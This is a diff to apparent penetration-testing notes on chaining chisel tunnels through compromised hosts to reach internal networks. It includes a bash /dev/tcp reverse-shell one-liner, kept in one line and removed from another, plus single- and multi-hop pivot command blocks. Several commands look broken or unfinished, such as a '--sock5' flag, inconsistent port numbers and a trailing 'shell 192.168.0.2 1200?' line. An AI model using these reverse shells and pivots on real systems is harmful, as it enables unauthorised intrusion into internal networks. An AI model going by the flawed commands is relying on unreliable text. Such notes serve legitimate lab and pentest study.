@@ -109,23 +109,66 @@ curl 127.0.0.1:8001 # will then access $clientip:$port
 
 ## Local Pivots and Chaining with Chisel Explained
 
-Using `nohup` and `&` will background a job on a shell - very useful on linux  
+Using `nohup` and `&` will background a job on a shell - very useful on Linux; for Windows there is dos `start /B chisel.exe` or PowerShell `start-job { chisel.exe ... }`.
 
-Presuming you have a reverse shell on both 192.168.0.1 and 192.168.0.2, where `chisel server` has opened port `10001` from `nohup ./chisel client 10.10.10.10:10000 10002:127.0.0.1:10002 &` with second reverse shell on 192.168.0.2 being: `bash -c 'bash -i >& /dev/tcp/192.168.0.1/10001 0>&1'`; consider the following as:
+Presuming you have a reverse shell on both 192.168.0.1 and 192.168.0.2, where `chisel server` has opened port `10001` from `nohup ./chisel client 10.10.10.10:10000 10002:127.0.0.1:10002 &` with second reverse shell on 192.168.0.2 being: `bash -c 'bash -i >& /dev/tcp/192.168.0.1/10001 0>&1'`. Beware the example below does not contain authentication mechanism used by `chisel` for most to keep the commands a short as possible, but use one and consider the following as two example the second (multiple pivots) being a extension of the first (single pivot):
 ```bash
 # 10.10.10.10 = kali
 # 192.168.0.1 = externally facing compromised box 
 # 192.168.0.2 = internal virtual network not exposed to internet
 # 192.168.0.3 = internal virtual network not exposed to internet
 
-chisel server -p 10000 -reverse -v
-# 192.168.0.1 - $kali
-nohup ./chisel client 10.10.10.10:10000 10002:127.0.0.1:10000 &
+# Single Pivot
+# Kali -> Box1 -> Box2
+# Kali:
+chisel server -host 10.10.10.10 -p 10000 --reverse --sock5 -v
+./chisel client 127.0.0.1:10011 socks # $Kaliclient_pivot_toBox2 
+
+# 192.168.0.1
+# Box 1 server for pivoting from Box 2
+./chisel server -host 192.168.0.1 --reverse --socks5 -p 11000
+# Connect back to the server on kali through $Kaliclient on 127.0.0.1:10011
+nohup ./chisel client 10.10.10.10:10000 R:10011:127.0.0.1:11000 &
+
 # 192.168.0.2 - 
 nohup ./chisel client 192.168.0.1:10002 10002:127.0.0.1:10002 &
-# Reverse shell from 192.168.0.3
-bash -c 'bash -i >& /dev/tcp/192.168.0.2/10002 0>&1'
+
 ```
+
+```bash
+# Kali <-> Box 1 <-> Box 2 <-> Box 3 
+# Server
+# Client Reverse -> Remote Server
+# Client Sock -> Local Server
+
+# Kali
+./chisel server -host 10.10.10.10 --reverse --socks5 -p 10000 
+./chisel client 127.0.0.1:10011 socks # $Kaliclient_pivot_toBox2
+./chisel client 127.0.0.1:10012 socks # $Kaliclient_pivot_toBox3
+# Box 1 <-> Kali
+nohup ./chisel client 10.10.10.10:10000 10001:socks
+
+
+# Box 1 server for pivoting from Box 2
+./chisel server -host 192.168.0.1 --reverse --socks5 -p 11000
+# Connect back to the server on kali through $Kaliclient on 127.0.0.1:10011
+nohup ./chisel client 10.10.10.10:10000 R:10011:127.0.0.1:11000 &
+
+# Box 2 -> Box 1 -> Kali
+# Box 1
+nohup ./chisel client 127.0.0.1:11012 socks & # $Box1client
+nohup ./chisel client 10.10.10.10:10000 R:10011:127.0.0.1:11011 & # $Kaliclient_pivottoBox3
+# Box 2
+./chisel server -host 192.168.0.2 --reverse --socks5 -p 12000 
+# Connect back to the server on Box 1 through $Box1client on 127.0.0.1:11012
+nohup ./chisel client 192.168.0.1:11000 R:11012:127.0.0.1:12000 &
+# Box 3 192.168.0.2 
+# shell 192.168.0.2 1200?
+
+
+```
+
+
 
 [Consideration for Windows](https://learn.microsoft.com/en-US/troubleshoot/windows-client/deployment/create-user-defined-service)
 
